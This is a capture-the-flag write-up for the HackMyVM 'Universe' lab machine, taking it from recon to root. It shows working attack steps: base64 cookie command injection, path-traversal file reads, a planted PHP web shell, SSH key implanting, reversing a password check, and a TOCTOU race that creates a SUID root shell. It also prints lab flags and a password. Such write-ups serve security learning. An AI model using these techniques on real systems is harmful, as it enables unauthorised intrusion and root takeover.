# Universe

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.110:21
Open 10.0.2.110:22
Open 10.0.2.110:1212
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.110
PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.3
22/tcp   open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 95:d6:5d:68:a3:38:f7:74:87:b3:99:20:f8:be:45:4d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM58U6deEEvoBSP/xaG8NMjGhf7yBtgC2K7CF8avvbKl2joe5DSVQhG+g7fZAT5rngnZ4rlmAQbc2CKT07gVpko=
|   256 11:77:31:ae:36:4e:22:45:9c:89:8f:5e:e6:01:83:0d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGiBKKPqWAO890ITgVbdfJ9EK6+TLL5U3nS//abs2Izw
1212/tcp open  http    syn-ack Werkzeug httpd 2.2.2 (Python 3.11.2)
| http-title: Universe
|_Requested resource was /?user=791
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (1212)

When changing the `user` to invalid value you get redirect to same host with different user id, however the id changes nothing as it seems.

![writeup.png](/assets/pentest/hackmyvm/universe/writeup.png)

```bash
└─$ ffuf -u 'http://10.0.2.110:1212/?user=FUZZ' -w <(seq 1 10000) -fs 1584 -r
9                       [Status: 200, Size: 1187, Words: 392, Lines: 46, Duration: 19ms]
```

Something different on [http://10.0.2.110:1212/?user=9](http://10.0.2.110:1212/?user=9)

![writeup-1.png](/assets/pentest/hackmyvm/universe/writeup-1.png)

The cookie should be base64 encoded and it's basically a reverse shell
```bash
└─$ curl 'http://10.0.2.110:1212/?user=9' -b 'exec=system("id")' -is | htmlq 'body p' -t
Result: Invalid cookie value

└─$ curl 'http://10.0.2.110:1212/?user=9' -b 'exec=os.system("id")' -is | htmlq 'body p' -t
Result: Invalid cookie value

└─$ curl 'http://10.0.2.110:1212/?user=9' -b 'exec=__import__("os").system("id")' -is | htmlq 'body p' -t
Result: Invalid cookie value

└─$ curl 'http://10.0.2.110:1212/?user=9' -b "exec=$(echo -n id | base64 -w0)" -is | htmlq 'body p' -t
Result: uid=1000(miwa) gid=1000(miwa) groups=1000(miwa)
```

## SSH (miwa)

```bash
└─$ ssh-keygen -f id_rsa -P x -q
└─$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' > ~/.ssh/authorized_keys" | tee entry
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKfT8VVlLS6ZGR6tbU/07dI0q4pkIDN1Pu1s5ps4o61 woyag@kraken' > ~/.ssh/authorized_keys
```

```bash
└─$ curl 'http://10.0.2.110:1212/?user=9' -b "exec=$(cat entry | base64 -w0)" -is | htmlq 'body p' -t
Result:

└─$ ssh -i id_rsa miwa@10.0.2.110
miwa@universe:~$ id
uid=1000(miwa) gid=1000(miwa) groups=1000(miwa)
```

### HTTP (8080)

There's another internal application running on 8080 and the user is **void**.
```bash
miwa@universe:~$ ss -tunlp4
Netid    State      Recv-Q     Send-Q         Local Address:Port         Peer Address:Port    Process
udp      UNCONN     0          0                    0.0.0.0:68                0.0.0.0:*
tcp      LISTEN     0          4096               127.0.0.1:8080              0.0.0.0:*
tcp      LISTEN     0          128                  0.0.0.0:22                0.0.0.0:*
tcp      LISTEN     0          128                  0.0.0.0:1212              0.0.0.0:*        users:(("python3",pid=443,fd=5),("python3",pid=443,fd=3))
miwa@universe:~$ curl 0:8080
...
<nav>
    <a href="?file=love.php">Love</a>
    <a href="?file=shine.php">Shine</a>
    <a href="?file=sadness.php">Sadness</a>
</nav>
...
miwa@universe:~$ ps aux | grep 8080
void         441  0.0  1.0 201316 21628 ?        S    02:30   0:00 php -S 127.0.0.1:8080 index.php
miwa       13896  0.0  0.0   6332  2004 pts/0    S+   02:57   0:00 grep 8080
```

Port forward
```bash
└─$ ssh -i id_rsa miwa@10.0.2.110 -L 8080:0:8080
```

![writeup-2.png](/assets/pentest/hackmyvm/universe/writeup-2.png)

### LFI

This smells like LFI, so I started fuzzing
```bash
└─$ ffuf -u 'http://localhost:8080/?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 1060
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 53ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 52ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 56ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 54ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 58ms]
....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 57ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 60ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 57ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 59ms]
....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 58ms]
....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 57ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 53ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 55ms]
....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 59ms]
....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 60ms]
....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 56ms]
....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 61ms]
....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 71ms]
....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 65ms]
....//....//....//....//....//etc/passwd [Status: 200, Size: 2271, Words: 341, Lines: 82, Duration: 61ms]
:: Progress: [929/929] :: Job [1/1] :: 925 req/sec :: Duration: [0:00:01] :: Errors: 24 ::
```

```bash
└─$ curl 'http://localhost:8080/?file=....//....//....//etc/passwd' -s | htmlq '.container' -t | grep sh$
    root:x:0:0:root:/root:/bin/bash
miwa:x:1000:1000::/home/miwa:/usr/bin/bash
void:x:1001:1001::/home/void:/bin/bash
```

### RCE

We can create the files on the system hence we can render custom PHP code
```bash
miwa@universe:~$ echo '<?php system($_REQUEST[0]); ?>' > /tmp/letmein.php
---
└─$ curl 'http://localhost:8080/?file=....//....//....//tmp/letmein.php&0=id' -s | htmlq '.container' -t
    uid=1001(void) gid=1001(void) groups=1001(void)
```

## SSH (void)

Get SSH access
```bash
└─$ curl 'http://localhost:8080/?file=....//....//....//tmp/letmein.php' -G --data-urlencode "0=$(cat entry)" -s | htmlq '.container' -t
└─$ ssh -i id_rsa void@10.0.2.110
void@universe:~$ id
uid=1001(void) gid=1001(void) groups=1001(void)
```

There's also password for void user
```bash
void@universe:~$ cat .pass
Cg78F6WT8HkSBiG71
```

::: tip Creds
`void:Cg78F6WT8HkSBiG71`
:::

### User.txt

```bash
void@universe:~$ cat user.txt
void{70zHEmM1WJL0jjm2WBorHVEQj}
```

## Privilege Escalation (root)

Application WAF:
```php
void@universe:~/web-void$ cat index.php
...
    <?php
    if (isset($_GET['file'])) {
        $file = str_replace("../", '', $_GET['file']);
        $path = "/home/void/web-void/$file";

        if ($file === 'shine.php') {
            echo '<p>Like the stars in the universe, your inner light shines with unique beauty and incomparable purpose. Although you may feel "void" at this moment or any other time, remember that in the infinite canvas of the cosmos, every star has its place, and you, dear stranger, are a priceless star in the constellation of life. Your presence illuminates the world in ways you cannot imagine. You can still go on</p>';
        } elseif (file_exists($path)) {
            include($path);
        } else {
            echo '<p>Under construction</p>';
        }
    }
    ?>
...
```

```bash
void@universe:~$ sudo -l
Matching Defaults entries for void on universe:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User void may run the following commands on universe:
    (root) NOPASSWD: /scripts/Quasar
```

In `/scripts` there's 2 files, **Quasar** which can be executed as sudo and some `print.sh` script
```bash
void@universe:~$ cat /scripts/print.sh ;echo
#!/usr/bin/env bash
tmp_file=$(/usr/bin/mktemp -u /tmp/read-XXXXX)
(
    umask 110
    /usr/bin/touch "$tmp_file";
)
/usr/bin/echo "test" > "$tmp_file"
data=$(/usr/bin/cat "$tmp_file")
eval "$data"
/usr/bin/rm "$tmp_file"

void@universe:~$ file /scripts/Quasar
/scripts/Quasar: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=00a219f57c37379e9a7d16a82edc8463bf5c4b8e, for GNU/Linux 4.4.0, stripped
```

Something funky is going on with the password, it seems to be encrypting value to match password "hash"
```bash
└─$ scp -i id_rsa void@10.0.2.110:/scripts/Quasar .
└─$ strings Quasar
...
Uso: ./Quasar <password>
/scripts/print.sh
Error!
GCC: (GNU) 13.2.1 20230801
...
└─$ ltrace ./Quasar letmein
sin(0.000000)                                                                                                                     = 0.000000
pow(0.000000, 2.000000)                                                                                                           = 0.000000
log(3.000000)                                                                                                                     = 1.098612
sqrt(1.000000)                                                                                                                    = 1.000000
...
log(16.000000)                                                                                                                    = 2.772589
sqrt(14.000000)                                                                                                                   = 3.741657
exp(3.741657)                                                                                                                     = 42.167821
tgamma(14.000000)                                                                                                                 = 6227020800.000001
SHA256_Init(0x7fffbee716b0, 0x7fffbee71770, 0x7fffbee71770, 52)                                                                   = 1
SHA256_Update(0x7fffbee716b0, 0x7fffbee71770, 10, 0x7fffbee71770)                                                                 = 1
SHA256_Final(0x7fffbee71720, 0x7fffbee716b0, 0x7fffbee716b0, 0)                                                                   = 1
sprintf("e6", "%02x", 0xe6)                                                                                                       = 2
...
sprintf("ff", "%02x", 0xff)                                                                                                       = 2
SHA256_Init(0x7fffbee716b0, 0x7fffbee717c0, 0x7fffbee717c0, 0)                                                                    = 1
SHA256_Update(0x7fffbee716b0, 0x7fffbee72f28, 10, 0x7fffbee72f28)                                                                 = 1
SHA256_Final(0x7fffbee71720, 0x7fffbee716b0, 0x7fffbee716b0, 0)                                                                   = 1
...
strcmp("e6172f449180c694bb1e6d284b63311b"..., "f53ea193677449480a743acadfafcda3"...)                                              = -1
printf("\302\241Error!\n"¡Error!
)                                                                                                        = 9
+++ exited (status 0) +++

└─$ ltrace -e strcmp -s 10000 ./Quasar letmein
Quasar->strcmp("e6172f449180c694bb1e6d284b63311bde94bcf761d6bfda4d8bb06319c2faff", "f53ea193677449480a743acadfafcda3adf7b4e8a5a3214c290a076ea5a83783") = -1
¡Error!
+++ exited (status 0) +++

└─$ echo e6172f449180c694bb1e6d284b63311bde94bcf761d6bfda4d8bb06319c2faff |xxd -r -p
/DƔm(Kc1ֿMc                                                                                                                                                                                                        
└─$ echo f53ea193677449480a743acadfafcda3adf7b4e8a5a3214c290a076ea5a83783 | xxd -r -p
>gtIH
t:ͣ襣!L)
n7                                                                                                                                                                                                                
```

- [https://dogbolt.org/?id=a2c00d94-0f6e-43da-95d6-b8ec03eac3d2#Hex-Rays=205&BinaryNinja=248](https://dogbolt.org/?id=a2c00d94-0f6e-43da-95d6-b8ec03eac3d2#Hex-Rays=205&BinaryNinja=248)

Kindly ask GPT to recover the original code with relevant parts
```c
#include <math.h>
#include <stdint.h>
#include <stdio.h>

#define KEY_LEN 10

static void generate_key(char out[KEY_LEN + 1]) {
    const double PI = 3.141592653589793;

    for (int i = 0; i < KEY_LEN; ++i) {
        double acc = 0.0;

        for (int j = 0; j <= 4; ++j) {
            double angle = (PI * i) / 3.0 + j;
            double s = sin(angle);
            double term_log = log((double)(j + i + 3)) * (s * s);
            double term_exp = exp(sqrt((double)(j + i + 1)));

            double term_tgamma = 0.0;
            if (i == 0 && j == 0) {
                term_tgamma = tgamma(1.0);  // = 1.0
            }

            acc += term_tgamma + term_exp + term_log;
        }

        long truncated = (long)floor(100.0 * acc);
        int digit = truncated % 10;
        if (digit < 0) digit += 10;

        out[i] = '0' + digit;
    }

    out[KEY_LEN] = '\0';
}

int main(void) {
    char key[KEY_LEN + 1];
    generate_key(key);

    printf("Key: %s\n", key);
    return 0;
}
```

- [https://www.programiz.com/c-programming/online-compiler](https://www.programiz.com/c-programming/online-compiler)
- Key: **9740252204**

If successful the script is ran as root. The file is created randomly, however we can hijack it because program is vulnerable to TOCTOU.
```bash
for ((i=0; i<1000; i++)); do
    file=$(ls -1 /tmp/read-* 2>/dev/null)
    if [[ -f "$file" ]]; then
        echo 'install -m4777 /bin/bash /tmp/rootbash' > "$file"
    fi
done
```

```bash
void@universe:~$ for ((i=0; i<1000; i++)); do file=$(ls -1 /tmp/read-* 2>/dev/null); if [[ -f "$file" ]]; then echo 'install -m4777 /bin/bash /tmp/rootbash' > "$file"; fi; done &
[1] 16939
void@universe:~$ sudo /scripts/Quasar 9740252204
void@universe:~$ ls /tmp
letmein.php  rootbash  systemd-private-a24e3b6fd758447ab9479879250ff41b-systemd-logind.service-ZGWBwH

void@universe:~$ /tmp/rootbash -p
rootbash-5.2# id
uid=1001(void) gid=1001(void) euid=0(root) groups=1001(void)
```

### Root.txt

```bash
rootbash-5.2# cat /root/root.txt
root{k7Ei4kA88gtL957yYbWdRfVJg}
```